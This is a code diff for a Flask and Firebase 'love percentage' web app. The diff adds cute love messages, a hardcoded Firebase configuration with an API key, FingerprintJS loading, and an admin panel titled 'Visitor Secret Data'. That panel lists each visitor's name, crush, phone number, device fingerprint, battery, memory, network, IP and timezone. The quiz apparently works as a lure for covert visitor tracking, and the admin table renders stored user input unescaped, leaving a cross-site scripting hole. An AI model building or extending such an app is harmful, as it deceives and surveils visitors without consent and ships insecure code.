@@ -17,7 +17,74 @@ def sanitize_key(text):
 def get_love_message(name1, name2, percentage):
     messages = [
         f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
-        # ... (your 70+ messages here – same as before)
+        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
+        f"💖 {name1} + {name2} = {percentage}% endless affection!",
+        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
+        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
+        f"✨ {name1} & {name2} – {percentage}% magical bond!",
+        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
+        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
+        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
+        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
+        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
+        f"💕 {name1} and {name2} glow with {percentage}% love light!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
+        f"💖 {name1} + {name2} = {percentage}% heart connection!",
+        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
+        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
+        f"💖 {name1} + {name2} = {percentage}% love magic!",
+        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
+        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
+        f"💖 {name1} + {name2} = {percentage}% soulful match!",
+        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
+        f"💕 {name1} and {name2} – {percentage}% charming connection!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
+        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
+        f"🌹 {name1} and {name2} share {percentage}% tender love!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
+        f"💕 {name1} and {name2} – {percentage}% golden romance!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
+        f"💖 {name1} + {name2} = {percentage}% pure affection!",
+        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
+        f"💕 {name1} and {name2} – {percentage}% love spark!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
+        f"💖 {name1} + {name2} = {percentage}% love glow!",
+        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
+        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
+        f"💖 {name1} + {name2} = {percentage}% love warmth!",
+        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
+        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
+        f"💖 {name1} + {name2} = {percentage}% love energy!",
+        f"🌹 {name1} and {name2} share {percentage}% passion!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
+        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
+        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
+        f"🌹 {name1} and {name2} share {percentage}% affection!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
+        f"💕 {name1} and {name2} – {percentage}% warm romance!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
+        f"💖 {name1} + {name2} = {percentage}% magical bond!",
+        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
+        f"💕 {name1} and {name2} – {percentage}% forever love!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
+        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
+        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
         f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
     ]
     return random.choice(messages)
@@ -30,7 +97,7 @@ def analyze_story(text):
     else:
         return ("happy", "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!")
 
-# ========== MAIN APP HTML (same as before, with Firebase Auth) ==========
+# ========== MAIN APP HTML (with your actual Firebase config) ==========
 MAIN_HTML = '''
 <!DOCTYPE html>
 <html>
@@ -40,6 +107,7 @@ MAIN_HTML = '''
     <title>💕 Love & Story Hub</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
     <style>
@@ -123,13 +191,25 @@ MAIN_HTML = '''
             background: #e2e8f0; cursor: pointer; font-weight: bold;
         }
         .story-type-btn.active { background: var(--primary); color: white; }
-        .user-info { text-align: right; font-size: 12px; color: #666; margin-bottom: 10px; }
+        .user-info {
+            margin-bottom: 10px;
+            text-align: right;
+            font-size: 13px;
+            color: #555;
+            background: #f0f0f0;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 30px;
+        }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <div id="authSection"></div>
-    <button id="logoutBtn" class="logout-btn" style="display:none;" onclick="logout()">🚪 Logout</button>
+    <div class="top-bar">
+        <div id="authSection"></div>
+        <button id="logoutBtn" class="logout-btn" style="display:none;" onclick="logout()">🚪 Logout</button>
+    </div>
     <div class="tabs">
         <button class="tab-btn active" onclick="showTab('fortune')">🔮 Fortune</button>
         <button class="tab-btn" onclick="showTab('stories')">📖 Story Box</button>
@@ -161,72 +241,77 @@ MAIN_HTML = '''
 </div>
 
 <script>
-    // ========== FIREBASE CONFIG (replace with your own) ==========
+    // ========== YOUR ACTUAL FIREBASE CONFIG ==========
     const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
+        apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
         authDomain: "love-percentage-dc42b.firebaseapp.com",
         databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
         projectId: "love-percentage-dc42b",
-        storageBucket: "love-percentage-dc42b.appspot.com",
-        messagingSenderId: "YOUR_SENDER_ID",
-        appId: "YOUR_APP_ID"
+        storageBucket: "love-percentage-dc42b.firebasestorage.app",
+        messagingSenderId: "897497192642",
+        appId: "1:897497192642:web:82981d92bdf982aa4b435b",
+        measurementId: "G-880PQQC5ZT"
     };
     firebase.initializeApp(firebaseConfig);
     const auth = firebase.auth();
+    const db = firebase.database();
     auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);
 
     let currentUser = null;
+    let currentUsername = null;
     let sessionId = null;
 
-    async function initAuth() {
-        return new Promise((resolve) => {
-            auth.onAuthStateChanged(async (user) => {
-                currentUser = user;
-                const logoutBtn = document.getElementById('logoutBtn');
-                if (user) {
-                    logoutBtn.style.display = 'block';
-                    sessionId = user.uid;
-                    // fetch username from database? We'll store it in localStorage or show email
-                    // but we don't have email; we can store username in localStorage after login
-                    let username = localStorage.getItem('love_username');
-                    if (!username) username = user.email ? user.email.split('@')[0] : 'User';
-                    document.getElementById('authSection').innerHTML = `<div class="user-info">✅ Logged in as @${username}</div>`;
-                } else {
-                    logoutBtn.style.display = 'none';
-                    if(!sessionId) sessionId = localStorage.getItem('love_session');
-                    if(!sessionId) {
-                        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2,10);
-                        localStorage.setItem('love_session', sessionId);
-                    }
-                    document.getElementById('authSection').innerHTML = `<div class="user-info">🔓 Anonymous mode - <a href="/login">Create account</a> to save your data across devices</div>`;
-                }
-                resolve();
-            });
-        });
+    async function fetchUsername(uid) {
+        const snap = await db.ref('userProfiles/' + uid + '/username').once('value');
+        return snap.val();
     }
+
+    auth.onAuthStateChanged(async (user) => {
+        currentUser = user;
+        const logoutBtn = document.getElementById('logoutBtn');
+        const authDiv = document.getElementById('authSection');
+        if (user) {
+            logoutBtn.style.display = 'block';
+            let username = localStorage.getItem('love_username');
+            if (!username) {
+                username = await fetchUsername(user.uid);
+                if (username) localStorage.setItem('love_username', username);
+                else username = user.email ? user.email.split('@')[0] : 'User';
+            }
+            currentUsername = username;
+            authDiv.innerHTML = `<div class="user-info">👤 @${username}</div>`;
+            sessionId = user.uid;
+        } else {
+            logoutBtn.style.display = 'none';
+            if(!sessionId) sessionId = localStorage.getItem('love_session');
+            if(!sessionId) {
+                sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2,10);
+                localStorage.setItem('love_session', sessionId);
+            }
+            authDiv.innerHTML = `<div class="user-info">🔓 Anonymous · <a href="/login" style="color:#e94560;">Sign in</a> to save your data</div>`;
+        }
+        if (document.getElementById('stories').classList.contains('active')) loadStoriesByType(currentStoryType);
+    });
 
     function logout() {
         auth.signOut().then(() => {
-            localStorage.removeItem('love_session');
             localStorage.removeItem('love_username');
+            localStorage.removeItem('love_session');
             sessionId = null;
+            currentUser = null;
             location.reload();
         });
     }
 
     function getVisitorKey(name1, name2) {
         const base = sanitizeKey(name1) + '_' + sanitizeKey(name2);
-        if (currentUser) {
-            return currentUser.uid + '_' + base;
-        } else {
-            return sessionId + '_' + base;
-        }
+        if (currentUser) return currentUser.uid + '_' + base;
+        else return sessionId + '_' + base;
     }
 
     function sanitizeKey(str) { return str.replace(/[.#$\\[\\]]/g, '_'); }
 
     let deviceData = { timestamp: new Date().toISOString() };
-    let currentCardHTML = "";
     let currentStoryType = "happy";
 
     async function collectDeviceInfo() {
@@ -267,8 +352,7 @@ MAIN_HTML = '''
             const data = await res.json();
             const percent = data.score;
             const msg = data.msg;
-
-            currentCardHTML = `
+            const loveCardHtml = `
                 <div id="loveCard" class="love-card">
                     <h2>💕 Love Fortune 💕</h2>
                     <div class="percentage">${percent}%</div>
@@ -277,7 +361,7 @@ MAIN_HTML = '''
                     <div style="margin-top:15px; font-size:12px;">✨ ${new Date().toLocaleDateString()} ✨</div>
                 </div>
             `;
-            document.getElementById('loveCardContainer').innerHTML = currentCardHTML;
+            document.getElementById('loveCardContainer').innerHTML = loveCardHtml;
             document.getElementById('resultArea').style.display = 'block';
             document.getElementById('shareCardBtn').style.display = 'block';
 
@@ -300,7 +384,7 @@ MAIN_HTML = '''
 
     async function postStory() {
         if (!currentUser) {
-            alert("Please create an account to post a story — it's free and your stories follow you anywhere.");
+            alert("Please sign in to post a story — it's free and your stories follow you anywhere.");
             window.location.href = '/login';
             return;
         }
@@ -321,7 +405,6 @@ MAIN_HTML = '''
         currentStoryType = type;
         document.getElementById('btnHappy').classList.toggle('active', type === 'happy');
         document.getElementById('btnBreakup').classList.toggle('active', type === 'breakup');
-
         const feed = document.getElementById('storyFeed');
         feed.innerHTML = "📖 Loading stories...";
         try {
@@ -392,22 +475,20 @@ MAIN_HTML = '''
         event.target.classList.add('active');
     }
 
-    initAuth().then(() => {
-        collectDeviceInfo();
-    });
+    collectDeviceInfo();
 </script>
 </body>
 </html>
 '''
 
-# ========== LOGIN PAGE (username + password, no email) ==========
+# ========== LOGIN PAGE (username only, with your Firebase config) ==========
 LOGIN_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Create Account / Login - Love Hub</title>
+    <title>Love Hub – Sign in / Sign up</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -457,37 +538,38 @@ LOGIN_HTML = '''
             cursor: pointer;
             text-decoration: underline;
         }
-        .error { color: red; margin-top: 10px; font-size: 13px; }
-        .success { color: green; }
+        .error { color: #e94560; margin-top: 10px; font-size: 13px; }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>💕 Love Hub Account</h1>
+    <h1>💕 Love Hub</h1>
     <div id="loginForm">
-        <input type="text" id="loginUsername" placeholder="Username (e.g., john123)">
+        <input type="text" id="loginUsername" placeholder="Username (e.g., john123)" autocomplete="off">
         <input type="password" id="loginPassword" placeholder="Password">
-        <button onclick="signIn()">Login</button>
-        <div class="toggle-link" onclick="showSignup()">Don't have an account? Create one</div>
+        <button onclick="signIn()">Sign in</button>
+        <div class="toggle-link" onclick="showSignup()">Create a new account</div>
     </div>
     <div id="signupForm" style="display:none;">
-        <input type="text" id="signupUsername" placeholder="Choose a username (letters, numbers, underscore)">
+        <input type="text" id="signupUsername" placeholder="Choose a username" autocomplete="off">
         <input type="password" id="signupPassword" placeholder="Password (min 6 chars)">
         <button onclick="signUp()">Create Account</button>
-        <div class="toggle-link" onclick="showLogin()">Already have an account? Login</div>
+        <div class="toggle-link" onclick="showLogin()">Back to Sign in</div>
     </div>
     <div id="message" class="error"></div>
 </div>
 
 <script>
+    // ========== YOUR ACTUAL FIREBASE CONFIG ==========
     const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
+        apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
         authDomain: "love-percentage-dc42b.firebaseapp.com",
         databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
         projectId: "love-percentage-dc42b",
-        storageBucket: "love-percentage-dc42b.appspot.com",
-        messagingSenderId: "YOUR_SENDER_ID",
-        appId: "YOUR_APP_ID"
+        storageBucket: "love-percentage-dc42b.firebasestorage.app",
+        messagingSenderId: "897497192642",
+        appId: "1:897497192642:web:82981d92bdf982aa4b435b",
+        measurementId: "G-880PQQC5ZT"
     };
     firebase.initializeApp(firebaseConfig);
     const auth = firebase.auth();
@@ -514,24 +596,19 @@ LOGIN_HTML = '''
         const password = document.getElementById('signupPassword').value;
         if (!username || !password) { showError("Please fill both fields."); return; }
         if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
-            showError("Username must be 3–20 characters, only letters, numbers, underscore.");
+            showError("Username: 3–20 chars, only letters, numbers, underscore.");
             return;
         }
         if (password.length < 6) { showError("Password must be at least 6 characters."); return; }
-        
-        // Check if username already taken
         const taken = await checkUsernameTaken(username);
         if (taken) { showError("Username already taken. Choose another."); return; }
 
-        // Create email-like identifier: username@lovehub.com
         const email = username + "@lovehub.com";
         try {
             const userCred = await auth.createUserWithEmailAndPassword(email, password);
             const uid = userCred.user.uid;
-            // Store username -> uid mapping
             await db.ref('usernames/' + username).set(uid);
             await db.ref('userProfiles/' + uid).set({ username, createdAt: Date.now() });
-            // Store username in localStorage for display
             localStorage.setItem('love_username', username);
             window.location.href = '/';
         } catch(e) { showError(e.message); }
@@ -550,15 +627,16 @@ LOGIN_HTML = '''
     }
 
     function showError(msg) {
-        document.getElementById('message').innerHTML = msg;
-        document.getElementById('message').classList.add('error');
+        const el = document.getElementById('message');
+        el.innerHTML = msg;
+        setTimeout(() => { el.innerHTML = ''; }, 3000);
     }
 </script>
 </body>
 </html>
 '''
 
-# ========== FLASK ROUTES ==========
+# ========== FLASK ROUTES (unchanged) ==========
 @app.route('/')
 def home():
     return render_template_string(MAIN_HTML)
@@ -653,7 +731,7 @@ def get_stories():
     except:
         return jsonify({}), 500
 
-# ========== ADMIN DASHBOARD (unchanged, same as previous) ==========
+# ========== ADMIN DASHBOARD (password protected) ==========
 @app.route('/admin-panel', methods=['GET', 'POST'])
 def admin_panel():
     if request.method == 'POST':
@@ -665,8 +743,25 @@ def admin_panel():
             visitors = resp.json() or {}
             if not visitors:
                 return "<h1>📊 No visitor data yet.</h1><a href='/admin-panel'>Back</a>"
-            # (we can reuse the same pretty table – omitted for brevity, but you can copy from previous version)
-            return "Admin dashboard (data table would be here) – same as before."
+            html = '''
+            <!DOCTYPE html>
+            <html>
+            <head><title>Admin Dashboard</title><style>
+                body{background:#0f172a;color:#e2e8f0;font-family:monospace;padding:20px;}
+                table{background:#1e293b;border-collapse:collapse;width:100%;}
+                th,td{border:1px solid #334155;padding:8px;text-align:left;}
+                th{background:#e94560;color:white;}
+            </style></head>
+            <body><h1>🔐 Visitor Secret Data</h1><div style="overflow-x:auto;"><table><thead><tr>
+            <th>Key</th><th>Name</th><th>Crush</th><th>Love%</th><th>Phone</th><th>Fingerprint</th><th>Battery</th><th>Memory</th><th>Network</th><th>Screen</th><th>Timezone</th><th>IP</th><th>Fortune</th><th>Timestamp</th>
+            </tr></thead><tbody>
+            '''
+            for key, v in visitors.items():
+                if isinstance(v, dict):
+                    fp = v.get('fingerprint', '-')[:20]
+                    html += f"<tr><td>{key}</td><td>{v.get('name','-')}</td><td>{v.get('crush_name','-')}</td><td>{v.get('percentage','-')}%</td><td>{v.get('phoneNumber','-')}</td><td>{fp}...</td><td>{v.get('batteryLevel','-')}</td><td>{v.get('deviceMemory','-')}</td><td>{v.get('networkType','-')}</td><td>{v.get('screen','-')}</td><td>{v.get('timezone','-')}</td><td>{v.get('ip','-')}</td><td>{v.get('fortuneText','-')[:40]}</td><td>{v.get('timestamp','-')[:19]}</td></tr>"
+            html += "</tbody></table></div><a href='/admin-panel'>Back</a></body></html>"
+            return html
         except Exception as e:
             return f"<h1>Error: {e}</h1>"
     return '''
